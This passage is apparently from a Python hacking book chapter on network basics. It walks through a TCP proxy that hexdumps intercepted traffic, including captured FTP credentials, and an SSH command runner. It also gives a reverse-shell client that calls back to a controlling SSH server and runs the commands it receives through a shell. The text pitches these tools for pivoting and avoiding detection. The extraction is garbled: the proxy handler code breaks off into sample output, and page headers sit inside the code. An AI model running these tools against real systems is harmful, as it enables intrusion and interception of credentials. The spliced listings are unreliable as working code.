server.listen(5)
while True:
client_socket, addr = server.accept()
# print out the local connection information
print "[==>] Received incoming connection from %s:%d" % ¬
(addr[0],addr[1])
# start a thread to talk to the remote host
proxy_thread = threading.Thread(target=proxy_handler, ¬
args=(client_socket,remote_host,remote_port,receive_first))
proxy_thread.start()
def main():
# no fancy command-line parsing here
if len(sys.argv[1:]) != 5:
print "Usage: ./proxy.py [localhost] [localport] [remotehost] ¬
[remoteport] [receive_first]"
print "Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True"
sys.exit(0)
# setup local listening parameters
local_host = sys.argv[1]
local_port = int(sys.argv[2])
# setup remote target
remote_host = sys.argv[3]
remote_port = int(sys.argv[4])
# this tells our proxy to connect and receive data
# before sending to the remote host
receive_first = sys.argv[5]
if "True" in receive_first:
receive_first = True
else:
receive_first = False
# now spin up our listening socket
server_loop(local_host,local_port,remote_host,remote_port,receive_first)
main()
Most of this should look familiar: we take in some command-line argu-
ments and then fire up a server loop that listens for connections. When
The Network: Basics 21
a fresh connection request comes in, we hand it off to our proxy_handler,
which does all of the sending and receiving of juicy bits to either side of the
data stream.
Let’s dive into the proxy_handler function now by adding the following
code above our main function.
def proxy_handler(client_socket, remote_host, remote_port, receive_first):
# connect to the remote host
remote_socket = socket.socket(socket.AF_INET,
socket.SOCK_STREAM)
remote_socket.connect((remote_host,remote_port))
# receive data from the remote end if necessary
u if receive_first:
v remote_buffer = receive_from(remote_socket)
w hexdump(remote_buffer)
# send it to our response handler
x remote_buffer = response_handler(remote_buffer)
# if we have data to send to our local client, send it
if len(remote_buffer):
print "[] Received %d bytes from localhost." % len(local_ ¬
buffer)
hexdump(local_buffer)
# send it to our request handler
local_buffer = request_handler(local_buffer)
# send off the data to the remote host
remote_socket.send(local_buffer)
print "[==>] Sent to remote."
22 Chapter 2
# receive back the response
remote_buffer = receive_from(remote_socket)
if len(remote_buffer):
print "[] Received incoming connection from 127.0.0.1:59218
0000 32 32 30 20 50 72 6F 46 54 50 44 20 31 2E 33 2E 220 ProFTPD 1.3.
0010 33 61 20 53 65 72 76 65 72 20 28 44 65 62 69 61 3a Server (Debia
0020 6E 29 20 5B 3A 3A 66 66 66 66 3A 35 30 2E 35 37 n) [::ffff:22.22
0030 2E 31 36 38 2E 39 33 5D 0D 0A .22.22]..
[] Received 12 bytes from localhost.
0000 55 53 45 52 20 74 65 73 74 79 0D 0A USER testy..
[==>] Sent to remote.
[] Received 13 bytes from localhost.
0000 50 41 53 53 20 74 65 73 74 65 72 0D 0A PASS tester..
[==>] Sent to remote.
[*] No more data. Closing connections.
You can clearly see that we are able to successfully receive the FTP ban-
ner and send in a username and password, and that it cleanly exits when
the server punts us because of incorrect credentials.
The Network: Basics 25
ssH with Paramiko
Pivoting with BHNET is pretty handy, but sometimes it’s wise to encrypt
your traffic to avoid detection. A common means of doing so is to tunnel
the traffic using Secure Shell (SSH). But what if your target doesn’t have
an SSH client (like 99.81943 percent of Windows systems)?
While there are great SSH clients available for Windows, like Putty,
this is a book about Python. In Python, you could use raw sockets and
some crypto magic to create your own SSH client or server—but why
create when you can reuse? Paramiko using PyCrypto gives you simple
access to the SSH2 protocol.
To learn about how this library works, we’ll use Paramiko to make
a connection and run a command on an SSH system, configure an SSH
server and SSH client to run remote commands on a Windows machine,
and finally puzzle out the reverse tunnel demo file included with Paramiko
to duplicate the proxy option of BHNET. Let’s begin.
First, grab Paramiko using pip installer (or download it from http://
www.paramiko.org/):
pip install paramiko
We’ll use some of the demo files later, so make sure you download them
from the Paramiko website as well.
Create a new file called bh_sshcmd.py and enter the following:
import threading
import paramiko
import subprocess
u def ssh_command(ip, user, passwd, command):
client = paramiko.SSHClient()
v #client.load_host_keys('/home/justin/.ssh/known_hosts')
w client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(ip, username=user, password=passwd)
ssh_session = client.get_transport().open_session()
if ssh_session.active:
x ssh_session.exec_command(command)
print ssh_session.recv(1024)
return
ssh_command('192.168.100.131', 'justin', 'lovesthepython','id')
This is a fairly straightforward program. We create a function called
ssh_command u, which makes a connection to an SSH server and runs a single
command. Notice that Paramiko supports authentication with keys v
instead of (or in addition to) password authentication. Using SSH key
authentication is strongly recommended on a real engagement, but for
ease of use in this example, we’ll stick with the traditional username and
password authentication.
26 Chapter 2
Because we’re controlling both ends of this connection, we set the
policy to accept the SSH key for the SSH server we’re connecting to w and
make the connection. Finally, assuming the connection is made, we run the
command that we passed along in the call to the ssh_command function in
our example the command id x.
Let’s run a quick test by connecting to our Linux server:
C:\tmp> python bh_sshcmd.py
Uid=1000(justin) gid=1001(justin) groups=1001(justin)
You’ll see that it connects and then runs the command. You can easily
modify this script to run multiple commands on an SSH server or run com-
mands on multiple SSH servers.
So with the basics done, let’s modify our script to support running
commands on our Windows client over SSH. Of course, normally when
using SSH, you use an SSH client to connect to an SSH server, but because
Windows doesn’t include an SSH server out-of-the-box, we need to reverse
this and send commands from our SSH server to the SSH client.
Create a new file called bh_sshRcmd.py and enter the following:2
import threading
import paramiko
import subprocess
def ssh_command(ip, user, passwd, command):
client = paramiko.SSHClient()
#client.load_host_keys('/home/justin/.ssh/known_hosts')
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(ip, username=user, password=passwd)
ssh_session = client.get_transport().open_session()
if ssh_session.active:
ssh_session.send(command)
print ssh_session.recv(1024)#read banner
while True:
command = ssh_session.recv(1024) #get the command from the SSH ¬
server
try:
cmd_output = subprocess.check_output(command, shell=True)
ssh_session.send(cmd_output)
except Exception,e:
ssh_session.send(str(e))
client.close()
return
ssh_command('192.168.100.130', 'justin', 'lovesthepython','ClientConnected')
2. This discussion expands on the work by Hussam Khrais, which can be found on http://
resources.infosecinstitute.com/.
The Network: Basics 27
The first few lines are like our last program and the new stuff starts
in the while True: loop. Also notice that the first command we send is
ClientConnected. You’ll see why when we create the other end of the SSH
connection.
Now create a new file called bh_sshserver.py and enter the following:
import socket
import paramiko
import threading
import sys
# using the key from the Paramiko demo files
u host_key = paramiko.RSAKey(filename='test_rsa.key')
v class Server (paramiko.ServerInterface):
def _init_(self):
self.event = threading.Event()
def check_channel_request(self, kind, chanid):
if kind == 'session':
return paramiko.OPEN_SUCCEEDED
return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
def check_auth_password(self, username, password):
if (username == 'justin') and (password == 'lovesthepython'):
return paramiko.AUTH_SUCCESSFUL
return paramiko.AUTH_FAILED
server = sys.argv[1]
ssh_port = int(sys.argv[2])
w try:
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((server, ssh_port))
sock.listen(100)
print '[+] Listening for connection ...'
client, addr = sock.accept()
except Exception, e:
print '[-] Listen failed: ' + str(e)
sys.exit(1)
print '[+] Got a connection!'
x try:
bhSession = paramiko.Transport(client)
bhSession.add_server_key(host_key)
server = Server()
try:
bhSession.start_server(server=server)
except paramiko.SSHException, x:
print '[-] SSH negotiation failed.'